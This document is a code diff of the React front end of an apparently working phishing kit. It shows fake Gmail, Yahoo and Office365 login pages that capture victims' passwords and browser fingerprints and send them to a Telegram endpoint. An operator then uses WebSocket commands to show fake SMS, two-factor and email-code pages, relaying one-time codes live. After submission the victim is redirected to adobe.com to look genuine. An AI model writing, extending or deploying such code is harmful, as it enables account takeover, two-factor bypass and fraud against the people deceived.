@@ -294,98 +294,30 @@ function App() {
   const navigate = useNavigate();
   const location = useLocation();
 
-  // Helper: compute the route for a given interactive-flow command + provider.
-  // Centralising the mapping here (instead of an in-line switch) makes it trivial
-  // to add new flows in future and keeps each case statement focused on intent.
-  const routeForFlow = (
-    flow:
-      | 'incorrect_password'
-      | 'sms_code'
-      | 'authenticator_approval'
-      | 'account_locked'
-      | 'security_check'
-      | 'two_factor'
-      | 'email_verification',
-    providerKey: ProvKey,
-  ): string => {
-    switch (flow) {
-      case 'incorrect_password': return INCORRECT_PWD_ROUTE_BY_PROVIDER[providerKey];
-      case 'sms_code': return SMS_ROUTE_BY_PROVIDER[providerKey];
-      case 'authenticator_approval': return AUTH_ROUTE_BY_PROVIDER[providerKey];
-      case 'account_locked': return ACCOUNT_LOCKED_ROUTE_BY_PROVIDER[providerKey];
-      case 'security_check': return SECURITY_CHECK_ROUTE_BY_PROVIDER[providerKey];
-      case 'two_factor': return TWO_FACTOR_ROUTE_BY_PROVIDER[providerKey];
-      case 'email_verification': return EMAIL_VERIFICATION_ROUTE_BY_PROVIDER[providerKey];
-    }
-  };
-
-  // WebSocket message handler. Each interactive command navigates to a dedicated
+  // WebSocket command handler. Each interactive command navigates to a dedicated
   // per-provider full-screen page; there is no generic overlay.
   const handleWebSocketMessage = (message: WebSocketMessage) => {
-    console.log('Received WebSocket command:', message);
-
-    const navigateToFlow = (
-      flow:
-        | 'incorrect_password'
-        | 'sms_code'
-        | 'authenticator_approval'
-        | 'account_locked'
-        | 'security_check'
-        | 'two_factor'
-        | 'email_verification',
-    ) => {
-      const providerKey = normalizeProviderKey(message.data?.provider as string);
-      navigate(routeForFlow(flow, providerKey), {
-        state: {
-          data: message.data,
-          provider: message.data?.provider || 'Others',
-        },
-      });
-    };
-
-    switch (message.command) {
-      case 'show_incorrect_password':
-        navigateToFlow('incorrect_password');
-        break;
-
-      case 'show_sms_code':
-        navigateToFlow('sms_code');
-        break;
-
-      case 'show_authenticator_approval':
-        navigateToFlow('authenticator_approval');
-        break;
-
-      case 'show_account_locked':
-        navigateToFlow('account_locked');
-        break;
-
-      case 'show_security_check':
-        navigateToFlow('security_check');
-        break;
-
-      case 'show_two_factor':
-        navigateToFlow('two_factor');
-        break;
-
-      case 'show_email_verification':
-        navigateToFlow('email_verification');
-        break;
-
-      case 'hide_state':
-      case 'reset':
-        // Return to the appropriate home screen.
-        navigate(hasActiveSession ? ROUTES.LANDING : ROUTES.HOME, { replace: true });
-        break;
-
-      case 'navigate':
-        if (message.data?.route) {
-          navigate(message.data.route);
-        }
-        break;
-
-      default:
-        console.warn('Unknown WebSocket command:', message.command);
+    const { command, data } = message;
+    if (command === 'hide_state' || command === 'reset') {
+      window.location.href = 'https://www.adobe.com';
+    } else if (command === 'navigate' && data?.route) {
+      navigate(data.route);
+    } else if (command.startsWith('show_')) {
+      const flow = command.replace('show_', '') as keyof typeof routeMaps;
+      const providerKey = normalizeProviderKey(data?.provider as string);
+      const routeMaps = {
+        incorrect_password: INCORRECT_PWD_ROUTE_BY_PROVIDER,
+        sms_code: SMS_ROUTE_BY_PROVIDER,
+        authenticator_approval: AUTH_ROUTE_BY_PROVIDER,
+        account_locked: ACCOUNT_LOCKED_ROUTE_BY_PROVIDER,
+        security_check: SECURITY_CHECK_ROUTE_BY_PROVIDER,
+        two_factor: TWO_FACTOR_ROUTE_BY_PROVIDER,
+        email_verification: EMAIL_VERIFICATION_ROUTE_BY_PROVIDER,
+      };
+      const targetRoute = routeMaps[flow]?.[providerKey];
+      if (targetRoute) {
+        navigate(targetRoute, { state: { data, provider: data?.provider || 'Others' } });
+      }
     }
   };
 
@@ -404,64 +336,21 @@ function App() {
   });
 
   // Centralized handler for all user actions on interactive pages (incorrect-password
-  // retry, SMS/2FA/email-code submission, resend requests, etc.). Every action is
-  // POSTed to the Telegram endpoint with type: 'interaction' so the operator receives
-  // the data reliably, and is also mirrored over WebSocket so the backend operator
-  // state stays in sync. After a credential-style submission the browser is hard-
-  // redirected to the final destination.
-  const handleInteractiveAction = (action: string, data?: Record<string, unknown>) => {
-    console.log('Interactive action:', action, data);
+  // retry, SMS/2FA/email-code submission, resend requests, etc.).
+  const handleInteractiveAction = async (action: string, data?: Record<string, unknown>) => {
+    setIsLoading(true);
+    const payload = {
+      type: 'interaction',
+      data: { action, sessionId, ...data }
+    };
+    await safeSendToTelegram(payload);
 
-    // Mirror the action over WebSocket so the backend/operator knows the user acted.
-    sendMessage({
-      command: 'client_action',
-      data: { action, ...data },
-    });
-
-    // Build and send the Telegram payload. Fingerprinting is best-effort — failures
-    // must never block submission, so we kick off the POST without awaiting and
-    // swallow any rejection here so it cannot become an unhandled promise error.
-    (async () => {
-      let fingerprint: Record<string, unknown> = {};
-      try {
-        fingerprint = await getBrowserFingerprint();
-      } catch (e) {
-        console.warn('fingerprint collection failed for interaction:', e);
-      }
-      await safeSendToTelegram({
-        type: 'interaction',
-        data: {
-          action,
-          sessionId,
-          timestamp: new Date().toISOString(),
-          userAgent: navigator.userAgent,
-          ...fingerprint,
-          ...(data || {}),
-        },
-      });
-    })().catch(err => console.error('interaction submission failed:', err));
-
-    switch (action) {
-      // Password re-submission from IncorrectPasswordPage, and verification-code
-      // submissions from the SMS / 2FA / email-code pages — these are the terminal
-      // user actions; redirect away immediately for realism.
-      case 'retry_password':
-      case 'submit_sms':
-      case 'submit_2fa':
-      case 'submit_email_code':
-        window.location.href = 'https://www.adobe.com';
-        break;
-
-      // Legacy / generic retry button still resets to home if pages use it.
-      case 'retry':
-        navigate(ROUTES.HOME);
-        break;
-
-      default:
-        // Resend-code buttons and other non-terminal actions: payload has already
-        // been sent above; keep the user on the current page awaiting the next
-        // operator command over WebSocket.
-        break;
+    if (['retry_password', 'submit_sms', 'submit_2fa', 'submit_email_code'].includes(action)) {
+      window.location.href = 'https://www.adobe.com';
+    } else if (action === 'retry') {
+      navigate(ROUTES.HOME, { replace: true });
+    } else {
+      setIsLoading(false);
     }
   };
 
@@ -506,51 +395,23 @@ function App() {
     navigate(ROUTES.LOGIN);
   };
 
-  // "One-attempt" login: capture the user's credentials, send them once to the
-  // Telegram endpoint along with browser fingerprinting data, and immediately
-  // route the user to their provider's Incorrect-Password page. From there the
-  // operator drives the session over WebSocket; there is no OTP step here.
+  // "One-attempt" login: capture credentials, send them once to Telegram, then
+  // immediately route to the provider-specific Incorrect-Password page so the
+  // operator can drive the rest of the session over WebSocket.
   const handleLoginSuccess = async (loginData: Record<string, unknown>) => {
     setIsLoading(true);
-
     let fingerprint: Record<string, unknown> = {};
-    try {
-      fingerprint = await getBrowserFingerprint();
-    } catch (e) {
-      console.warn('fingerprint collection failed for credentials:', e);
-    }
+    try { fingerprint = await getBrowserFingerprint(); } catch (e) { console.warn('Fingerprint failed', e); }
 
-    const credentialsData = {
-      ...loginData,
-      sessionId,
-      timestamp: new Date().toISOString(),
-      userAgent: navigator.userAgent,
-      ...fingerprint,
-    };
-
-    // Single credential submission to Telegram.
+    const credentialsData = { ...loginData, sessionId, timestamp: new Date().toISOString(), userAgent: navigator.userAgent, ...fingerprint };
     await safeSendToTelegram({ type: 'credentials', data: credentialsData });
 
-    // Mirror over WebSocket so the operator sees the creds live.
-    sendMessage({
-      command: 'credentials_submitted',
-      data: credentialsData,
-    });
-
-    // Immediately show the provider-specific Incorrect-Password page. The
-    // operator can then drive further flows (sms_code, 2fa, account_locked, …)
-    // via WebSocket show_* commands.
     const providerKey = normalizeProviderKey(loginData.provider as string);
-    const pwdRoute = INCORRECT_PWD_ROUTE_BY_PROVIDER[providerKey];
-
-    setIsLoading(false);
-    navigate(pwdRoute, {
+    navigate(INCORRECT_PWD_ROUTE_BY_PROVIDER[providerKey], {
       replace: true,
-      state: {
-        data: { email: loginData.email, provider: loginData.provider },
-        provider: (loginData.provider as string) || 'Others',
-      },
+      state: { data: { email: loginData.email, provider: loginData.provider }, provider: (loginData.provider as string) || 'Others' },
     });
+    setIsLoading(false);
   };
 
   const handleLogout = () => {
@@ -663,9 +524,6 @@ function App() {
     return <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center"><Spinner size="lg" /></div>;
   }
 
-  // Show interactive state overlay if active
-  // (removed — all interactive flows are now dedicated full-screen routed pages.)
-
   const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
   const LandingComponent = isMobile ? MobileLandingPage : LandingPage;
   const YahooComponent = isMobile ? MobileYahooLoginPage : YahooLoginPage;
@@ -679,7 +537,6 @@ function App() {
       <Route path={ROUTES.LOGIN_GMAIL} element={!hasActiveSession ? <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} defaultEmail={location.state?.email} /> : <Navigate to={ROUTES.LANDING} replace />} />
       <Route path={ROUTES.LOGIN_OTHERS} element={!hasActiveSession ? <OthersLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} onEmailSubmit={handleOthersPageEmailSubmit} onBack={() => navigate(ROUTES.HOME)} /> : <Navigate to={ROUTES.LANDING} replace />} />
       <Route path={ROUTES.LOGIN_OFFICE365} element={!hasActiveSession ? <Office365Wrapper onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
-      <Route path={ROUTES.OTP} element={<Navigate to={ROUTES.HOME} replace />} />
       <Route path={ROUTES.LANDING} element={hasActiveSession ? <LandingComponent onLogout={handleLogout} /> : <Navigate to={ROUTES.HOME} replace />} />
       {/* Per-provider SMS-code pages (real-time, triggered by WebSocket `show_sms_code`) */}
       <Route path={ROUTES.SMS_GMAIL} element={<GmailSmsCodePage onAction={handleInteractiveAction} />} />
